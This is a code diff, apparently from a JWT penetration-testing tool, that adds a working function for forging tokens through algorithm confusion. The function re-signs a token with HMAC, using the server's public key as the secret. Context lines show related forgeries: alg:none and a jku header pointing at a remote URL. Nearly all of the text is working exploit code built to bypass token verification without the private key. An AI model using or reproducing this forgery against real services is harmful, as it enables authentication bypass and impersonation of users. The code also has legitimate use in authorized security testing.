@@ -88,6 +88,40 @@ def forge_alg_none(token: str) -> str:
     return f"{header_seg}.{payload_seg}."
 
 
+def forge_alg_confusion(token: str, public_key: str, *, alg: str = "HS256") -> str:
+    """Re-sign *token* as HS256/384/512 using the RSA/EC **public key's exact PEM
+    text** as the HMAC secret — the classic "verifier doesn't pin the algorithm
+    family" bypass. If the server's JWT library accepts whatever `alg` the token
+    declares and reuses the SAME key material to verify both RS*-signed and
+    HS*-signed tokens, this forged token validates under the public key alone: a
+    full forgery without ever touching the private key. Preserves the original
+    header (e.g. `kid`, so a verifier that looks up key material by `kid` still
+    resolves to the same public key) — only `alg` is flipped. Offline; the caller
+    replays the forged token themselves."""
+
+    token = token.strip()
+    if token.lower().startswith("bearer "):
+        token = token[7:].strip()
+    parts = token.split(".")
+    if len(parts) < 2:
+        raise ValueError("not a JWT")
+    alg_up = alg.upper()
+    if alg_up not in _HS_ALGS:
+        raise ValueError(f"unsupported HMAC algorithm {alg!r} (use HS256/HS384/HS512)")
+    try:
+        header = json.loads(_b64url_decode(parts[0]))
+    except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
+        header = {}
+    if not isinstance(header, dict):
+        header = {}
+    header = {**header, "alg": alg_up}
+    header_seg = _b64url_nopad(json.dumps(header, separators=(",", ":")).encode())
+    payload_seg = parts[1]
+    signing_input = f"{header_seg}.{payload_seg}".encode()
+    sig = _b64url_nopad(hmac.new(public_key.encode(), signing_input, _HS_ALGS[alg_up]).digest())
+    return f"{header_seg}.{payload_seg}.{sig}"
+
+
 def forge_remote_key_header(token: str, url: str, *, param: str = "jku") -> str:
     """Re-issue *token* with a ``jku``/``x5u`` header pointing at *url* (an OAST canary),
     keeping the original payload. A server that fetches the remote key material during
